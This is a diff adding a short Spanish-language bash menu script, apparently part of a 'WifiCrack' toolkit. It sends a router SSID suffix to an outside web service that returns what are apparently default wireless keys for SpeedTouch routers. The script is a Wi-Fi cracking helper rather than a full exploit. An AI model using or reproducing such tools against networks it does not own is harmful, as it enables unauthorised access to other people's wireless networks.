@@ -1,0 +1,12 @@
+bash .banner
+echo "Introduce las ultimas letras de la SSID:"
+read sda
+res=$(w3m -dump http://md5this.com/speedtoucher/callme.php?ssid=$sda)
+bash .banner
+echo "Mostrando resultados para la SSID $sda:"
+echo ""
+echo "$res"
+echo ""
+echo "Presiona una tecla para continuar..."
+read pause
+bash WifiCrack.sh
